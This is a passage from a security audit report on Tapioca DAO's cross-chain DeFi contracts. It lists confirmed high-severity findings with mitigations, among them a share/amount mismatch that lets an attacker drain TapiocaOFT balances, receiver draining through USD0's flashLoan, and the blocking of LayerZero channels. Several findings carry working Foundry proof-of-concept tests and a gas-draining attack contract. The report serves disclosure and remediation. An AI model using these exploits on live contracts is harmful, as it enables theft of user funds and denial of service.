1.  Since [`sendFromDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142) passes as value whole balance of the TapiocaOFT it is enough to specify the refundAddress in [callParams](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L123) as the address of the attacker.
2.  This way the whole balance will be transferred to the [\_lzSend](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L53) and any excess will be refunded to the `_refundAddress`.
3.  [This is how layer zero works](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/UltraLightNodeV2.sol#L151-L156).

### Tools Used

Foundry

### Recommended Mitigation Steps

One of the ways of tackling this issue is during the [`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L39) to:

*   Not allowing [`airdropAdapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41) and [`sendFromData.adapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L44) params to be passed as bytes but rather as `gasLimit` and `airdroppedAmount`, from which you would encode either `adapterParamsV1` or `adapterParamsV2`.
*   And then on the receiving side check and send with value only the amount the user has airdropped.

```solidity
// Only allow the airdropped amount to be used for another message
ISendFrom(address(this)).sendFrom{value: aidroppedAmount}(
   from,
   lzDstChainId,
   LzLib.addressToBytes32(from),
   amount,
   callParams
);
```

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290#issuecomment-1702995456)**

***

## [[H-14] All assets of (m)TapiocaOFT can be stealed by depositing to strategy cross chain call with 1 amount but maximum shares possible](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1281)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1281)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L224> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L450> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L47> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L58> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L154> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L181-L185> 

<https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBox.sol#L118>

Attacker can be debited only the least possible amount (`1`) but send the `share` argument as the maximum possible value corresponding to the `erc` balance of `(m)TapiocaOFT`. This would enable the attacker to steal all the `erc` balance of the `(m)TapiocaOFT` contract.

### Proof of Concept

In `BaseTOFT`, `SendToStrategy()`, has no validation and just delegate calls to `sendToStrategy()` function of the `BaseTOFTStrategyModule`.

In the mentioned module, the quantity debited from the user is the `amount` argument, having no validation in the corresponding `share` amount:

```solidity
function sendToStrategy(
    address _from,
    address _to,
    uint256 amount,
    uint256 share,
    uint256 assetId,
    uint16 lzDstChainId,
    ICommonData.ISendOptions calldata options
) external payable {
    require(amount > 0, "TOFT_0");
    bytes32 toAddress = LzLib.addressToBytes32(_to);
    _debitFrom(_from, lzEndpoint.getChainId(), toAddress, amount);
    ...
```

Then, a payload is sent to the destination chain in `_lzSend()` of type `PT_YB_SEND_STRAT`.

Again, in `BaseTOFT`, the function `_nonBlockingLzReceive()` handles the received message and delegate calls to the `BaseTOFTStrategyModule`, function `strategyDeposit()`. In this, function, among other things, it delegate calls to `depositToYieldbox()`, of the same module:

```solidity
function depositToYieldbox(
    uint256 _assetId,
    uint256 _amount,
    uint256 _share,
    IERC20 _erc20,
    address _from,
    address _to
) public {
    _amount = _share > 0
        ? yieldBox.toAmount(_assetId, _share, false)
        : _amount;
    _erc20.approve(address(yieldBox), _amount);
    yieldBox.depositAsset(_assetId, _from, _to, _amount, _share);
}
```

The `_share` argument is the one the user initially provided in the source chain; however, the `_amount`, is computed from the `yieldBox` ratio, effectively overriding the specified `amount` in the source chain of `1`. This will credit funds to the attacker from other users that bridged assets through `(m)TapiocaOFT`.

The following POC in Foundry demonstrates how an attacker can be debited on the source chain an amount of `1` but call `depositAsset()` on the destination chain with an amount of `2e18`, the available in the `TapiocaOFT` contract.

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTStrategyModule} from "contracts/tOFT/modules/BaseTOFTStrategyModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockYieldBox is Test {
    function depositAsset(
        uint256 assetId,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256, uint256) {}
    
    function toAmount(
        uint256,
        uint256 share,
        bool 
    ) external pure returns (uint256 amount) {
        // real formula amount = share._toAmount(totalSupply[assetId], _tokenBalanceOf(assets[assetId]), roundUp);
        // assume ratio is 1:1
        return share;
    }
}

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 internal constant PT_YB_SEND_STRAT = 770;

    function test_POC_SendToStrategy_WithoutAllDebitedFrom() public {
        vm.createSelectFork("https://eth.llamarpc.com");

        address mockERC20_ = address(new ERC20("mockERC20", "MERC20"));

        address strategyModule_ = address(new BaseTOFTStrategyModule(address(LZ_ENDPOINT), address(0), IYieldBoxBase(address(2)), "SomeName", "SomeSymbol", 18, block.chainid));

        address mockYieldBox_ = address(new MockYieldBox());

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            mockERC20_,
            IYieldBoxBase(mockYieldBox_),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(strategyModule_),
            payable(address(3)),
            payable(address(4))
        );

        // some user wraps 2e18 mock erc20
        address user_ = makeAddr("user");
        deal(mockERC20_, user_, 2e18);
        vm.startPrank(user_);
        ERC20(mockERC20_).approve(address(tapiocaOft_), 2e18);
        tapiocaOft_.wrap(user_, user_, 2e18);
        vm.stopPrank();

        address attacker_ = makeAddr("attacker");
        deal(attacker_, 1e18); // lz fees

        address from_ = attacker_;
        address to_ = attacker_;
        uint256 amount_ = 1;
        uint256 share_ = 2e18; // steal all available funds in (m)Tapioca (only 1 user with 2e18)
        uint256 assetId_ = 1;
        uint16 lzDstChainId_ = 102;
        address zroPaymentAddress_ = address(0);
        ICommonData.ISendOptions memory options_ = ICommonData.ISendOptions(200_000, zroPaymentAddress_);

        tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_, abi.encodePacked(tapiocaOft_));

        // attacker is only debited 1 amount, but specifies 2e18 shares, a possibly much bigger corresponding amount
        deal(mockERC20_, attacker_, 1);
        vm.startPrank(attacker_);
        ERC20(mockERC20_).approve(address(tapiocaOft_), 1);
        tapiocaOft_.wrap(attacker_, attacker_, 1);
        tapiocaOft_.sendToStrategy{value: 1 ether}(from_, to_, amount_, share_, assetId_, lzDstChainId_, options_);
        vm.stopPrank();

        bytes memory lzPayload_ = abi.encode(
            PT_YB_SEND_STRAT,
            bytes32(uint256(uint160(from_))),
            attacker_,
            amount_,
            share_,
            assetId_,
            zroPaymentAddress_
        );
        
        // attacker was debited from 1 amount, but deposit sends an amount of 2e18
        vm.expectCall(address(mockYieldBox_), 0, abi.encodeCall(MockYieldBox.depositAsset, (assetId_, address(tapiocaOft_), attacker_, 2e18, 2e18)));
        
        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
    }
}
```

</details>

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

Given that it's impossible to fetch the `YieldBox` ratio in the source chain, it's best to stick with the amount only and remove the `share` argument in the cross chain `sendToStrategy()` function call.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1281#issuecomment-1702991316)**

***

## [[H-15] Attacker can specify any `receiver` in `USD0.flashLoan()` to drain `receiver` balance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1223)
*Submitted by [mojito\_auditor](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1223), also found by [n1punp](https://github.com/code-423n4/2023-07-tapioca-findings/issues/308)*

The flash loan feature in USD0's `flashLoan()` function allows the caller to specify the `receiver` address. USD0 is then minted to this address and burnt from this address plus a fee after the callback. Since there is a fee in each flash loan, an attacker can abuse this to drain the balance of the `receiver` because the `receiver` can be specified by the caller without validation.

### Proof of Concept

The allowance checked that `receiver` approved to `address(this)` but not check if `receiver` approved to `msg.sender`

```solidity
uint256 _allowance = allowance(address(receiver), address(this));
require(_allowance >= (amount + fee), "USDO: repay not approved");
// @audit can specify receiver, drain receiver's balance
_approve(address(receiver), address(this), _allowance - (amount + fee));
_burn(address(receiver), amount + fee);
return true;
```

### Recommended Mitigation Steps

Consider changing the "allowance check" to be the allowance that the receiver gave to the caller instead of `address(this)`.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1223#issuecomment-1702986076)**

***

## [[H-16] Attacker can block LayerZero channel due to variable gas cost of saving payload](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1220)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1220)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/BaseUSDO.sol#L399> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L442> 

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L52>

This is an issue that affects `BaseUSDO`, `BaseTOFT`, and `BaseTapOFT` or all the contracts which are sending and receiving LayerZero messages.
The consequence of this is that anyone can with low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.

### Proof of Concept

I will illustrate the concept of blocking the pathway on the example of sending a message through `BaseTOFT’s` [`sendToYAndBorrow`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L290).
This function allows the user to mint/borrow `USDO` with some collateral that is wrapped in a `TOFT` and gives the option of transferring minted `USDO` to another chain.

The attack starts by invoking [`sendToYBAndBorrow`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L290) which delegate calls into [`BaseTOFTMarketModule`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L87).
If we look at the implementation inside the `BaseTOFTMarketModule` nothing is validated there except for the `lzPayload` which has the packetType of `PT_YB_SEND_SGL_BORROW`.

The only validation of the message happens inside the [`LzApp`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L49) with the configuration which was set.
What is restrained within this configuration is the [`payload size`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L52), which if not configured defaults to [10k bytes](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L18).

The application architecture was set up in a way that all the messages regardless of their packetType go through the same `_lzSend` implementation.
I’m mentioning that because it means that if the project decides to change the default payload size to something smaller(or bigger) it will be dictated by the message with the biggest possible payload size.

I’ve mentioned the [minimum gas enforcement in my other issue](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207) but even if that is fixed and a high min gas is enforced this is another type of issue.

To execute the attack we need to pass the following parameters to the function mentioned above:

```solidity
    function executeAttack() public {
        address tapiocaOFT = makeAddr("TapiocaOFT-AVAX");
        tapiocaOFT.sendToYBAndBorrow{value: enough_gas_to_go_through}(
            address from => // malicious user address
            address to => // malicious user address
            lzDstChainId => // any chain lzChainId
            bytes calldata airdropAdapterParams => // encode in a way to send to remote with minimum gas enforced by the layer zero configuration
            ITapiocaOFT.IBorrowParams calldata borrowParams, // can be anything
            ICommonData.IWithdrawParams calldata withdrawParams, // can be anything
            ICommonData.ISendOptions calldata options, // can be anything
            ICommonData.IApproval[] calldata approvals // Elaborating on this below
        )
    }
```

`ICommonData.IApproval[] calldata approvals` are going to be fake data so [max payload size limit is reached(10k)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L105-L112). The `target` of the 1st approval in the array will be the `GasDrainingContract` deployed on the receiving chain and the `permitBorrow = true`.

```solidity
    contract GasDrainingContract {
        mapping(uint256 => uint256) public storageVariables;
    
        function permitBorrow(
            address owner,
            address spender,
            uint256 value,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external {
            for (uint256 i = 0; i < 100000; i++) {
                storageVariables[i] = i;
            }
        }
    }
```

Let’s take an example of an attacker sending a transaction on the home chain which specifies a 1 million gasLimit for the destination transaction.

1.  Transaction is successfully received inside the [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L35) after which it reaches [\_blockingLzReceive](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L25).

2.  This is the first external call and according to [`EIP-150`](https://eips.ethereum.org/EIPS/eip-150) out of 1 million gas:

    *   63/64 or \~985k would be forwarded to the external call.
    *   1/64 or \~15k will be left for the rest of the execution.

3.  The cost of saving a big payload into the [`failedMessages`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L27-L29) and emitting events is higher than 15k.

When it comes to 10k bytes it is around 130k gas but even with smaller payloads, it is still significant. It can be tested with the following code:

<details>

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract FailedMessagesTest is Test {

    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;

    event MessageFailed(uint16 _srcChainId, bytes _srcAddress, uint64 _nonce, bytes _payload, bytes _reason);

    function setUp() public {}

    function testFMessagesGas() public {
        uint16 srcChainid = 1;
        bytes memory srcAddress = abi.encode(makeAddr("Alice"));
        uint64 nonce = 10;
        bytes memory payload = getDummyPayload(9999); // max payload size someone can send is 9999 bytes
        bytes memory reason = getDummyPayload(2);

        uint256 gasLeft = gasleft();
        _storeFailedMessage(srcChainid, srcAddress, nonce, payload, reason);
        emit log_named_uint("gas used", gasLeft - gasleft());
    }


    function _storeFailedMessage(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload,
        bytes memory _reason
    ) internal virtual {
        failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
        emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, _reason);
    }

    function getDummyPayload(uint256 payloadSize) internal pure returns (bytes memory) {
        bytes memory payload = new bytes(payloadSize);
        for (uint256 i = 0; i < payloadSize; i++) {
            payload[i] = bytes1(uint8(65 + i));
        }
        return payload;
    }
}
```

</details>

*   If the payload is 9999 bytes the cost of saving it and emitting the event is 131k gas.
*   Even with a smaller payload of 500 bytes the cost is 32k gas.

4.  If we can drain the 985k gas in the rest of the execution since storing `failedMessages` would fail the pathway would be blocked because this will fail at the level of LayerZero and result in [`StoredPayload`](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L122-L123).

5.  Let’s continue the execution flow just to illustrate how this would occur, inside the implementation for [`_nonblockingLzReceive`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L442) the `_executeOnDestination` is invoked for the right packet type and there we have another [external call](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L403) which delegatecalls into the right module.

Since it is also an external call only 63/64 gas is forwarded which is roughly:

*   970k would be forwarded to the module
*   15k reserved for the rest of the function

6.  This 970k gas is used for [`borrow`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L126), and it would be totally drained inside our [malicious GasDraining contract from above](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L187), and then the execution would continue inside the [`executeOnDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L430) which also fails due to 15k gas not being enough, and finally, it fails inside the [`_blockingLzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L27) due to out of gas, resulting in blocked pathway.

### Tools Used

Foundry

### Recommended Mitigation Steps

[`_executeOnDestination` storing logic](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L430) is just code duplication and serves no purpose.
Instead of that you should override the [`_blockingLzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L24).

Create a new storage variable called `gasAllocation` which can be set only by the owner and change the implementation to:

```solidity
(bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft() - gasAllocation, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));
```

While ensuring that `gasleft() > gasAllocation` in each and every case. This should be enforced on the sending side.

Now this is tricky because as I have shown the gas cost of storing payload varies with payload size meaning the `gasAllocation` needs to be big enough to cover storing max payload size.

### Other occurrences

This exploit is possible with all the packet types which allow arbitrary execution of some code on the receiving side with something like I showed with the `GasDrainingContract`. Since almost all packets allow this it is a common issue throughout the codebase, but anyway listing below where it can occur in various places:

<details>

### BaseTOFT

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L205>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L204>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L111>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L221>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L118>

### BaseUSDO

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L191>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L190>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L104>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L93>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L206>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L103>

### BaseTapOFT

*   <https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L225> Here we would need to pass `IERC20[] memory rewardTokens` as an array of one award token which is our malicious token which implements the `ERC20` and `ISendFrom` interfaces.

</details>

Since inside the `twTap.claimAndSendRewards(tokenID, rewardTokens)` there are no reverts in case the `rewardToken` is
invalid we can execute the gas draining attack inside the [`sendFrom`](https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L229)
whereby `rewardTokens[i]` is our malicious contract.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1220#issuecomment-1702980386)**

***

## [[H-17] Attacker can block LayerZero channel due to missing check of minimum gas passed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207), also found by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/841)*

This is an issue that affects all the contracts that inherit from `NonBlockingLzApp` due to incorrect overriding of the `lzSend` function and lack of input validation and the ability to specify whatever [`adapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L101) you want.
The consequence of this is that anyone can with a low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.

### Proof of Concept

**Layer Zero minimum gas showcase**

While sending messages through LayerZero, the sender can specify how much gas he is willing to give to the Relayer to deliver the payload to the destination chain. This configuration is specified in [relayer adapter params](https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters).
All the invocations of `lzSend` inside the TapiocaDao contracts naively assume that it is not possible to specify less than 200k gas on the destination, but in reality, you can pass whatever you want.
As a showcase, I have set up a simple contract that implements the `NonBlockingLzApp` and sends only 30k gas which reverts on the destination chain resulting in `StoredPayload` and blocking of the message pathway between the two lzApps.
The transaction below proves that if no minimum gas is enforced, an application that has the intention of using the `NonBlockingApp` can end up in a situation where there is a `StoredPayload` and the pathway is blocked.

Transaction Hashes for the example mentioned above:

*   LayerZero Scan: <https://layerzeroscan.com/106/address/0xe6772d0b85756d1af98ddfc61c5339e10d1b6eff/message/109/address/0x5285413ea82ac98a220dd65405c91d735f4133d8/nonce/1>
*   Tenderly stack trace of the sending transaction hash: <https://dashboard.tenderly.co/tx/avalanche-mainnet/0xe54894bd4d19c6b12f30280082fc5eb693d445bed15bb7ae84dfaa049ab5374d/debugger?trace=0.0.1>
*   Tenderly stack trace of the receiving transaction hash: <https://dashboard.tenderly.co/tx/polygon/0x87573c24725c938c776c98d4c12eb15f6bacc2f9818e17063f1bfb25a00ecd0c/debugger?trace=0.2.1.3.0.0.0.0>

**Attack scenario**

The attacker calls [`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L99) and specifies a small amount of gas in the [airdropAdapterParams(\~50k gas)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41).
The Relayer delivers the transaction with the specified gas at the destination.

The transaction is first validated through the LayerZero contracts before it reaches the `lzReceive` function. The Relayer will give exactly the gas which was specified through the `airdropAdapterParams`.
The line where it happens inside the LayerZero contract is [here](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L118), and `{gas: _gasLimit}` is the gas the sender has paid for.
The objective is that due to this small gas passed the transaction reverts somewhere inside the [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L36-L41) function and the message pathway is blocked, resulting in [`StoredPayload`](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L122).

The objective of the attack is that the execution doesn't reach the [`NonblockingLzApp`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L25) since then the behavior of the `NonBlockingLzApp` would be as expected and the pathway wouldn't be blocked,
but rather the message would be stored inside the [`failedMessages`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L18)

### Tools Used

Foundry, Tenderly, LayerZeroScan

### Recommended Mitigation Steps

The minimum gas enforced to send for each and every `_lzSend` in the app should be enough to cover the worst-case scenario for the transaction to reach the
first try/catch which is [here](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L25).

I would advise the team to do extensive testing so this min gas is enforced.

Immediate fixes:

1.  This is most easily fixed by overriding the [`_lzSend`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L49) and extracting the gas passed from adapterParams with [`_getGasLimit`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L63) and validating that it is above some minimum threshold.

2.  Another option is specifying the minimum gas for each and every packetType and enforcing it as such.

I would default to the first option because the issue is twofold since there is the minimum gas that is common for all the packets, but there is also the minimum gas per packet since each packet has a different payload size and data structure, and it is being differently decoded and handled.

Note: This also applies to the transaction which when received on the destination chain is supposed to send another message, this callback message should also be validated.

When it comes to the default implementations inside the [`OFTCoreV2`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L10) there are two packet types [`PT_SEND`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L94)
and [`PT_SEND_AND_CALL`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L119) and there is the available configuration of `useCustomAdapterParams` which can enforce the minimum gas passed. This should all be configured properly.

### Other occurrences

There are many occurrences of this issue in the TapiocaDao contracts, but applying option 1 I mentioned in the mitigation steps should solve the issue for all of them:

<details>

**TapiocaOFT**

`lzSend`

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L101> - lzData.extraGas This naming is misleading it is not extraGas it is the gas that is used by the Relayer.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L68>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L99>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L66>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L114>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L70>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L111>

`sendFrom`

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142> - This is executed as a part of lzReceive but is a message inside a message. It is also subject to the attack above, although it goes through the `PT_SEND` so adequate config should solve the issue.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L241>

### BaseUSDO

`lzSend`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L41>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L86>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L51>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L82>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L48>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L87>

`sendFrom`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L127>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L226>

### BaseTapOFT

`lzSend`

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L108>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L181>

